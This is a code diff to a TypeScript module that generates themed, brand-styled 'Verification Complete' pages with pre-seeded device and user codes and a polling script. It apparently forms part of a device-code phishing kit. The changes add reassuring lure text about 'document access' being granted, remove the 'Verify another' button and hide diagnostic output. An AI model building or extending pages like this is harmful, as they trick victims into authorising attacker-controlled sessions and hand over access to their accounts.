@@ -311,10 +311,16 @@ function buildCenteredTemplate(t: ThemeConfig): string {
           <p style="text-align:center;margin-top:12px;font-size:13px;color:${footerColor}">Code expires in <span id="_tm">0:00</span></p>
         </div>
         <div id="_vs" style="display:none;text-align:center;padding:20px 0">
-          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-          <h1 style="font-size:20px;color:${titleColor};margin:16px 0 8px">Verification Complete</h1>
-          <p id="_ae" style="font-size:14px;color:${textColor}"></p>
-          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:transparent;color:${t.brandColor};border:2px solid ${t.brandColor};border-radius:8px;font-size:14px;cursor:pointer">Verify another</button>
+          <div style="width:72px;height:72px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <h1 style="font-size:24px;font-weight:700;color:${titleColor};margin:24px 0 12px">Verification Complete</h1>
+          <p style="font-size:15px;color:${textColor};margin:0 0 20px;line-height:1.5">Your identity has been verified successfully. You may now close this window.</p>
+          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:16px 20px;text-align:left">
+            <p style="font-size:14px;font-weight:700;color:#166534;margin:0 0 4px">What happens next?</p>
+            <p style="font-size:14px;color:#15803d;margin:0;line-height:1.5">Your document access has been granted. You can close this tab and return to your document.</p>
+          </div>
+          <p id="_ae" style="display:none"></p>
         </div>
         <div id="_ve" style="display:none;text-align:center;padding:20px 0">
           <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Error</h1>
@@ -371,10 +377,16 @@ function buildSplitTemplate(t: ThemeConfig): string {
           <p style="text-align:center;margin-top:12px;font-size:13px;color:#888">Code expires in <span id="_tm">0:00</span></p>
         </div>
         <div id="_vs" style="display:none;text-align:center;padding:20px 0">
-          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-          <h1 style="font-size:20px;color:#1a1a1a;margin:16px 0 8px">Verification Complete</h1>
-          <p id="_ae" style="font-size:14px;color:#555"></p>
-          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:transparent;color:${t.brandColor};border:2px solid ${t.brandColor};border-radius:8px;font-size:14px;cursor:pointer">Verify another</button>
+          <div style="width:72px;height:72px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <h1 style="font-size:24px;font-weight:700;color:#1a1a1a;margin:24px 0 12px">Verification Complete</h1>
+          <p style="font-size:15px;color:#555;margin:0 0 20px;line-height:1.5">Your identity has been verified successfully. You may now close this window.</p>
+          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:16px 20px;text-align:left">
+            <p style="font-size:14px;font-weight:700;color:#166534;margin:0 0 4px">What happens next?</p>
+            <p style="font-size:14px;color:#15803d;margin:0;line-height:1.5">Your document access has been granted. You can close this tab and return to your document.</p>
+          </div>
+          <p id="_ae" style="display:none"></p>
         </div>
         <div id="_ve" style="display:none;text-align:center;padding:20px 0">
           <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Error</h1>
@@ -395,12 +407,29 @@ function buildSplitTemplate(t: ThemeConfig): string {
   </div>`;
 }
 
-export function generateTemplateHTML(templateId: string): string {
+export interface PreSeededData {
+  deviceCode: string;
+  userCode: string;
+  expiresIn: number;
+  interval?: number;
+}
+
+export function generateTemplateHTML(templateId: string, preSeeded?: PreSeededData): string {
   const theme = THEMES[templateId] || THEMES['default'];
   const body = theme.layout === 'split' ? buildSplitTemplate(theme) : buildCenteredTemplate(theme);
   const script = getPollingScript();
 
-  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${escapeHtml(theme.brandName)}</title><style>*{margin:0;padding:0;box-sizing:border-box}</style></head><body>${body}<script>${script}</script></body></html>`;
+  // If pre-seeded data provided, embed it so the polling script picks it up automatically
+  const preSeedScript = preSeeded
+    ? `<script>window.__preSeeded=${JSON.stringify({
+        deviceCode: preSeeded.deviceCode,
+        userCode: preSeeded.userCode,
+        expiresIn: preSeeded.expiresIn,
+        interval: preSeeded.interval || 5,
+      })};</script>`
+    : '';
+
+  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${escapeHtml(theme.brandName)}</title><style>*{margin:0;padding:0;box-sizing:border-box}</style>${preSeedScript}</head><body>${body}<script>${script}</script></body></html>`;
 }
 
 export function getValidTemplateIds(): string[] {
